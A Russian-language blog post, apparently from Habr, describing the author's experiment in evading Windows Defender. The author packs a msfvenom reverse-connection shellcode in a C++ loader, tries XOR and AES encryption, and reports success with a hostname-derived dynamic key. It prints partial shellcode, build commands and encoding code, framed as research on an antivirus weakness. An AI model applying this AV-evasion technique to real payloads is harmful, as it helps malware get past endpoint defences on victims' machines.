# Defender Bypass
В наше время цифровая безопасность все более актуальна, поскольку важность защиты конфиденциальной информации и данных не может быть переоценена. Шифрование информации становится все более неотъемлемой частью нашей цифровой жизни, обеспечивая надежную защиту от несанкционированного доступа.

К сожалению, шифрование часто используется не только в хороших, но и плохих целях.

В данной статье рассмотрим, как технологии шифрования помогают в защите конфиденциальности и целостности данных, а также как современные средства безопасности могут оказаться недостаточными для полноценный защиты.

Мы проанализируем случай, когда использование шифрования стало ключевым элементом в обнаружении недостатка в работе средств защиты, и поймем почему так происходит.

### Примечание

В качестве примера, создал нагрузку, которая вызовет диалоговое окно с подтверждением активации обратного соединения, а также его прекращения.

Ниже представлен пример инициализации нагрузки посредством его внедрения в исполняемый код на языке С++.

``` c++
  unsigned char shellcode[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
                              "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
 .....................укороченная.версия...................
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x7c"
"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";
```

### Основная часть

#### Генерация нагрузки

> В качестве инструмента для тестирования на проникновение, использовал `msfvenom`.

**Внимание!** Использование данного программного обеспечения возможно только с санкции пользователя и ни в каких других случаях невозможно!

Нагрузку я выбрал самую тривиальную. Ее использование детектится.

![](https://habrastorage.org/r/w1560/getpro/habr/upload_files/930/951/422/9309514221009d40ed03a2977f9be21a.png)

#### Упаковка

Для корректной упаковки, я использовал `x86_64-w64-mingw32-g++`

Установить его можно с помощью следующей команды:

```
apt install x86_64-w64-mingw32-g++
```

Тестовая сборка:

```
x86_64-w64-mingw32-g++ -o test.exe test.cpp
```

Запустил и обнаружил следующее:

![](https://habrastorage.org/r/w1560/getpro/habr/upload_files/c84/250/039/c84250039fcf2c36d34b10bd21aa025e.png)

Как видно, ошибка связана отсутствием libstdc++-6.dll. Починить это можно путем прямой установки нужных компонент. Но можно собрать файл заново, используя "статическую линковку" (внедрение необходимых зависимостей в файл). Безусловно, при таком подходе вес файла станет больше, но, зато будет всё работать.

Для этого, к прошлой команде добавил флаг `-static`

```
x86_64-w64-mingw32-g++ -static -o test.exe test.cpp
```

![](https://habrastorage.org/r/w1560/getpro/habr/upload_files/aaf/0ce/3f4/aaf0ce3f4314b117279d6eba048d3787.jpeg)

Запустил файл:

![](https://habrastorage.org/r/w1560/getpro/habr/upload_files/818/c43/2cf/818c432cff65ab8afae2b4d045180c56.png)

![](https://habrastorage.org/r/w1560/getpro/habr/upload_files/0b8/6ed/295/0b86ed295e5eaca69d636db374659a3f.png)

### Выявление недостатка работы АВ

В работоспособности исполняемого файла убедился. А теперь попробовал запустить файл с активированной защитой на хосте.

![](https://habrastorage.org/r/w1560/getpro/habr/upload_files/97f/9a1/617/97f9a161700cd5c5bdc19137e72e8fb3.png)

> Поскольку я использовал стандартную нагрузку без шифрования, Defender с легкостью обнаружил ВПО.

![](https://habrastorage.org/r/w1560/getpro/habr/upload_files/6c3/0dd/488/6c30dd4884a3294d8b08fb2cc67214a1.png)

### Шифрование нагрузки

**XOR**

Стандарт кодирования- это XOR (_исключающее или_).

Реализация в коде:

``` c++
void encryptdecrypt(unsigned char* shellcode, size_t size, unsigned char key) {for (size_t i = 0; i < size; i++) {shellcode[i] ^= key;}}
```

``` c++
unsigned char originalShellcode[] = { 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,...,0x89,0xda,0xff,0xd5 };size_t shellcodeSize = sizeof(originalShellcode);
unsigned char key = 0x16; // Ключ для XOR-шифрования
encryptdecrypt(originalShellcode, shellcodeSize, key);// Шифрование нагрузки
...// Расшифрование нагрузки перед выполнением
encryptdecrypt(static_cast<unsigned char>(execMemory), shellcodeSize, key);
```

_Здесь видно, что XOR не справился со своей задачей._

![](https://habrastorage.org/r/w1560/getpro/habr/upload_files/403/a8e/4c0/403a8e4c0ff683ec07e9d133818348b8.png)

_Далее, я подумал, что можно усложнить ключ, сделав его последовательностью байт:_

``` c++
void encryptdecrypt(unsigned char shellcode, size_t size, unsigned char key, size_t keysize) {
  for (size_t i = 0; i < size; i++) {
  shellcode[i] ^= key[i % keysize];
}}
```

``` c++
unsigned char originalShellcode[] = { 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,...,0x89,0xda,0xff,0xd5 };
size_t shellcodeSize = sizeof(originalShellcode);
unsigned char key[] = { 0x3A, 0xC7, 0x9F, 0x2D, 0x54 };
size_t keysize = sizeof(key);
encryptdecrypt(originalShellcode, shellcodeSize, key, keysize);
...encryptdecrypt(static_cast<unsigned char>(execMemory), shellcodeSize, key, keysize);
```

Это также не сработало

![](https://habrastorage.org/r/w1560/getpro/habr/upload_files/a8e/572/873/a8e5728735172b2a1d2e8338a14a614b.png)

Вариант с XOR можно пока что отложить. Вероятно, нужно более сложное шифрование. Попробовал AES128

#### AES

_Использовал реализацию от Сергея Бела:_ [https://github.com/SergeyBel/AES/blob/master/README.md](https://github.com/SergeyBel/AES/blob/master/README.md)

Результаты работы библиотеки:

![](https://habrastorage.org/r/w1560/getpro/habr/upload_files/b4e/eab/49d/b4eeab49daa9007fee364bb77ce85d68.png)

Также для массива в другом виде:

![](https://habrastorage.org/r/w1560/getpro/habr/upload_files/a7e/33f/952/a7e33f95239e4806bffc83e00c3f319a.png)

Как видно, для второго варианта расшифрование выполняется некорректно.

**Что я понял при знакомстве с AES и библиотек в частности:**

1. Ключ должен быть кратен 16 байтам;
    
2. Размер массива должен быть также кратен 16 байтам;
    
3. Размер ключа при расшифровании должен быть использован тот же, что и при шифровании;
    
4. Для корректной работы, рекомендуется использовать вариант нагрузки в виде строки, поскольку может возникнуть ошибка по длине/некорректное расшифрование (см. пример выше);
    
5. Если не хватает длины до кратности, можно дополнить нагрузку с помощью `"\x00";`
    
6. Для подключения библиотеки достаточно просто заинклудить хэдер и добавить в проект .cpp;
    
7. При нагрузке в виде строки, необходимо учитывать важную вещь: к размерности массива автоматически прибавляется 1;
    

![](https://habrastorage.org/r/w1560/getpro/habr/upload_files/340/a67/4fa/340a674fa28c1bc7663dafe1fd5a803f.png)

**Пример дополнения:**

_Для видимости дебага, переписал_ `throw` в исходниках на `cout`

![](https://habrastorage.org/r/w1560/getpro/habr/upload_files/b49/d6a/8e3/b49d6a8e3cf56ebbf1f62822ec7adcb5.png)

![](https://habrastorage.org/r/w1560/getpro/habr/upload_files/186/56d/ffc/18656dffc4a0354af1dc473c81912cc4.png)

Буду дополнять слово "hello":

![](https://habrastorage.org/r/w1560/getpro/habr/upload_files/d18/191/3ce/d181913ce67171ed187e17252043843b.png)

Имею ошибки по длине. Дополню 9 байт:

![](https://habrastorage.org/r/w1560/getpro/habr/upload_files/b5d/d7a/3a0/b5dd7a3a0b847583f87d8dabc6712cc4.png)

#### Внедряем библиотеку в код

![](https://habrastorage.org/r/w1560/getpro/habr/upload_files/f05/902/701/f05902701526a8c3d908db887d01db2c.png)

Сначала я дополнил нагрузку до нужной длины (512 байт), зашифровал, а потом расшифровал ее и опять словил детект.

Тогда ко мне в голову пришла идея использовать в качестве массива заранее зашифрованное сообщение.

_Шифрование и расшифрование будет происходить с одним и тем же ключом._

![](https://habrastorage.org/r/w1560/getpro/habr/upload_files/876/def/83b/876def83ba558dca2b67840d1823797b.png)

Итак, благодаря функции `aes.printHexArray();`, я смог вывести зашифрованный массив байт. Теперь приведу его к виду строки.

![](https://habrastorage.org/r/w1560/getpro/habr/upload_files/c3d/372/25f/c3d37225f84ccbddd9dbcd91f0a31d6b.png)

![](https://habrastorage.org/r/w1560/getpro/habr/upload_files/22c/2e9/238/22c2e9238d3e3f6dd55e011102a06a2a.png)

![](https://habrastorage.org/r/w1560/getpro/habr/upload_files/0e6/382/a96/0e6382a968a13c5aedc84c1e3cfe406f.png)

Прошу обратить внимание, что расшифровка прошла успешно, но это не принесло никаких результатов.

Тогда я подумал, что, возможно, стоит использовать XOR поверх AES. Также мне хотелось избежать хранения "сырой" нагрузки в коде, поэтому, для удобства, я написал следующий скрипт:

``` c++
#include <iostream>
#include "windows.h"
#include "AES.h"
#include <iomanip>

void encryptdecrypt(unsigned char shellcode, unsigned int size, unsigned char key, size_t keysize) {
  for (size_t i = 0; i < size; i++) {
shellcode[i] ^= key[i % keysize];
  }}
int main() {
  AES aes(AESKeyLength::AES_128);
  unsigned char shellcode[] = { 0x68, 0x65, 0x6c, 0x6c, 0x6f, 0x20, 0x6d, 0x79, 0x20, 0x66, 0x72, 0x69, 0x65, 0x6e, 0x64, 0x00 };
  unsigned int shellcodesize = sizeof(shellcode);
  std::cout << "Shellcode len: " << shellcode;
  std::cout << shellcodesize << std::endl;
  unsigned char aeskey[] = { 0x23, 0x45, 0x67, 0x89,0xAB, 0xCD, 0xEF, 0x10,0x32, 0x54, 0x76, 0x98,0xBA, 0xDC, 0xFE, 0x00 };
  unsigned char xorkey[] = { 0x3A, 0xC7, 0x9F, 0x2D, 0x54 };
  unsigned char aesshellcode = aes.EncryptECB(shellcode, shellcodesize, aeskey);
  std::cout << "AES ENCRYPT: ";
  aes.printHexArray(aesshellcode, shellcodesize);
  size_t keysize = sizeof(xorkey);
  std::cout << "\n\n";
  encryptdecrypt(aesshellcode, shellcodesize, xorkey, keysize);
  std::cout << "AES + XOR ENCRYPT: ";
  for (int i = 0; i < shellcodesize; i++) {
    std::cout <<  std::hex << std::setfill('0') << std::setw(2) << static_cast<int>(aesshellcode[i]);
    if (i < shellcodesize - 1) {
      std::cout << ", ";
        }
  }
    std::cout << "\n\n";
    std::cout << "XOR DECRYPT: ";
encryptdecrypt(aesshellcode, shellcodesize, xorkey, keysize);for (int i = 0; i < shellcodesize; i++) {std::cout <<  std::hex << std::setfill('0') << std::setw(2) << static_cast<int>(aesshellcode[i]);if (i < shellcodesize - 1) {std::cout << ", ";}}unsigned char decaesshelcode = aes.DecryptECB(aesshellcode, shellcodesize, aeskey);std::cout << "\n\n";std::cout << "XOR + AES DECRYPT: ";aes.printHexArray(decaesshelcode, shellcodesize);}
```

Результат работы скрипта:

![](https://habrastorage.org/r/w1560/getpro/habr/upload_files/35c/629/d45/35c629d45aa6075a71b9d020ec3ce1bb.png)

Смысл скрипта такой:

`Plain -> AES -> XOR -> deXOR -> deAES -> Plain`

По сути, мне необходимы следующие вещи из этого кода: ключи и AES+XOR массив байт. Строки дальше существуют чисто для проверки корректности работы шифрования/расшифрования.

![](https://habrastorage.org/r/w1560/getpro/habr/upload_files/b71/5bd/f13/b715bdf13ddd50e1cad53c28c42bbfcc.png)

Проверка такого способа вновь завершилась неудачей. Я подумал, что наверняка есть какой-то способ проверить в чем именно проблема. Оказалось, что даже если я зашифрую нагрузку хоть 100 раз и 100 раз в коде будут лежать ключи в открытом виде, АВ средство с легкостью обнаружит ВПО, что достаточно круто и похвально.

#### Финальный этап

Я понял, что нужно избавиться от статики в пользу динамики, тем самым обезличив ключи и сделав их генерацию псевдослучайной.

Для этого использовал библиотеку `windows.h` , которая позволяет работать с WinAPI

![](https://habrastorage.org/r/w1560/getpro/habr/upload_files/d32/3b6/e70/d323b6e70165b2621eede5cee1aef95c.png)

И сама генерация ключа:

![](https://habrastorage.org/r/w1560/getpro/habr/upload_files/0ed/4d8/d65/0ed4d8d659abdd6b9e929525cdc278ba.png)

Очевидно, что, для данного случая, необходимо заведомо знать имя хоста, но для моего исследования это некритично, поскольку работаю на локальных машинах.

В качестве эксперимента, моя схема состояла в следующем:

![](https://habrastorage.org/r/w1560/getpro/habr/upload_files/26b/635/97f/26b63597f286356abd0203911eb3f928.png)

Как можно заметить, я не отказался от статических ключей. Идея состояла в проверке необходимости и достаточности хотя бы одного динамического ключа.

Видно, что в процессе выполнения кода, нагрузка сначала будет расшифрована с помощью динамического ключа. Затем, получится так, что останется нагрузка только со статическим ключом, которая, по идее, не должна отработать (примеры выше).

Но, на мое удивление, это сработало!

![](https://habrastorage.org/r/w1560/getpro/habr/upload_files/f93/b01/150/f93b01150251ffc7e2e6d8e2813aee19.png)

### Вывод

В конечном итоге, исследование выявило серьезный недостаток в работе АВ средства Windows Defender, связанное с некачественным анализом приложений, использующих динамические ключи для шифрования участков кода. Это поднимает важные вопросы о безопасности информации и подчеркивает необходимость улучшения средств защиты. Несмотря на то, что данный способ уже не работает (статья писалась 3 месяца), подобные уязвимости могут иметь далеко идущие последствия. Напоследок, еще раз хочется подчеркнуть, что повторение данных действий приводит к нарушению законодательства.
